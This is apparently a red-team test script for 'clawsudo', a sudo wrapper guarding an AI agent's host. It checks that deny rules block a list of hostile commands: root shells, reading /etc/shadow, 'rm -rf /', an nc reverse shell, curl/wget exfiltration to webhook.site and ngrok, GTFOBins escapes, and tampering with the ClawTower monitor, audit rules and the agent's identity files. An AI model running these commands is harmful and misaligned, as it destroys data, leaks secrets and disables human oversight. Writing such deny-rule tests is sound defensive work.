#!/usr/bin/env bash
# Red Lobster v8 — Flag 16: CLAWSUDO DENY VERIFICATION
# Verify that deny rules actually block what they should.
# These should ALL be denied — any that succeed are policy failures.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag16" "Flag 16: CLAWSUDO DENY — Verify deny rules block correctly"

CS="clawsudo"
OUTDIR="$FLAG_DIR"

# Helper: check if clawsudo denies (exit 77)
check_denied() {
    local name="$1"
    shift
    local before
    before=$(wc -l < "$ALERT_LOG")
    
    eval "$@" > "$OUTDIR/deny_out.txt" 2>&1
    local exit_code=$?
    sleep 2
    
    local after
    after=$(wc -l < "$ALERT_LOG")
    local new=$((after - before))
    
    ((TOTAL++))
    
    if [[ $exit_code -eq 77 ]]; then
        # Denied as expected
        echo "| $TOTAL | $name | ✅ DENIED (77) | exit=$exit_code |" >> "$FLAG_RESULTS"
        echo "  [$TOTAL] $name → ✅ DENIED (correct)"
        ((DETECTED++))
    elif [[ $exit_code -eq 78 ]]; then
        # Timed out waiting for approval — effectively denied
        echo "| $TOTAL | $name | ✅ TIMEOUT (78) | exit=$exit_code |" >> "$FLAG_RESULTS"
        echo "  [$TOTAL] $name → ✅ TIMEOUT (effectively denied)"
        ((DETECTED++))
    else
        # Command ran or errored — policy failure
        local output
        output=$(head -2 "$OUTDIR/deny_out.txt" 2>/dev/null | tr '\n' '; ')
        echo "| $TOTAL | $name | ❌ NOT DENIED | exit=$exit_code output=${output:0:60} |" >> "$FLAG_RESULTS"
        echo "  [$TOTAL] $name → ❌ NOT DENIED (exit=$exit_code) — POLICY FAILURE"
        ((BYPASSED++))
    fi
}

# ─── Shell access should be denied ───────────────────────────────────────
check_denied "clawsudo bash" \
  "$CS bash"

check_denied "clawsudo sh" \
  "$CS sh"

check_denied "clawsudo bash -c 'id'" \
  "$CS bash -c id"

check_denied "clawsudo sh -c 'cat /etc/shadow'" \
  "$CS sh -c 'cat /etc/shadow'"

check_denied "clawsudo zsh" \
  "$CS zsh"

# ─── ClawTower tamper should be denied ───────────────────────────────────
check_denied "clawsudo rm /usr/local/bin/clawtower" \
  "$CS rm /usr/local/bin/clawtower"

check_denied "clawsudo chattr clawtower config" \
  "$CS chattr +i /etc/clawtower/config.toml"

check_denied "clawsudo auditctl -D" \
  "$CS auditctl -D"

check_denied "clawsudo sed -i /etc/clawtower/" \
  "$CS sed -i 's/enabled/disabled/' /etc/clawtower/config.toml"

check_denied "clawsudo tee /etc/clawtower/config.d/evil.toml" \
  "echo 'evil' | $CS tee /etc/clawtower/config.d/evil.toml"

# ─── Firewall disable should be denied ──────────────────────────────────
check_denied "clawsudo ufw disable" \
  "$CS ufw disable"

check_denied "clawsudo iptables -F" \
  "$CS iptables -F"

# ─── Dangerous rm should be denied ──────────────────────────────────────
check_denied "clawsudo rm -rf /etc" \
  "$CS rm -rf /etc"

check_denied "clawsudo rm -rf /" \
  "$CS rm -rf /"

# ─── Reverse shell should be denied ─────────────────────────────────────
check_denied "clawsudo bash -i" \
  "$CS bash -i"

check_denied "clawsudo nc -e /bin/bash" \
  "$CS nc -e /bin/bash 127.0.0.1 4444"

# ─── Identity file tamper should be denied ───────────────────────────────
check_denied "clawsudo tee SOUL.md" \
  "echo EVIL | $CS tee /home/openclaw/.openclaw/workspace/SOUL.md"

check_denied "clawsudo sed IDENTITY.md" \
  "$CS sed -i 's/Claw/Evil/' /home/openclaw/.openclaw/workspace/IDENTITY.md"

check_denied "clawsudo cat AGENTS.md (write via tee)" \
  "echo EVIL | $CS tee /home/openclaw/.openclaw/workspace/AGENTS.md"

# ─── Exfil staging domains should be denied ─────────────────────────────
check_denied "clawsudo curl webhook.site" \
  "$CS curl https://webhook.site/test"

check_denied "clawsudo wget ngrok.io" \
  "$CS wget https://abc.ngrok.io/exfil"

# ─── GTFOBins should be caught ──────────────────────────────────────────
check_denied "clawsudo find -exec" \
  "$CS find / -exec id \\;"

check_denied "clawsudo apt-get -o APT hook" \
  "$CS apt-get update -o APT::Update::Pre-Invoke::=id"

# Shell metacharacter tests: pipe/semicolon/$() are processed by the shell
# BEFORE clawsudo, so clawsudo cannot deny them. Defense is at behavior layer.
# Pipe-to-shell: verified via alert log (bare shell invocation detection).
rl_run "cat | bash pipe (behavior layer)" "$CS cat /etc/hostname | bash"

# sed ';id' — semicolon is inside sed expression, not shell metachar.
# clawsudo sees the full string — test with check_denied.
check_denied "clawsudo sed with semicolon in expression" \
  "$CS sed 's/x/y/;id' /etc/hostname"

# $() substitution: shell processes first, clawsudo sees `cat <id_output>`.
# Cannot be tested at clawsudo layer — defense is auditd logging.
# Removed from deny scoring (was always a false failure).

rl_summary
rl_cleanup
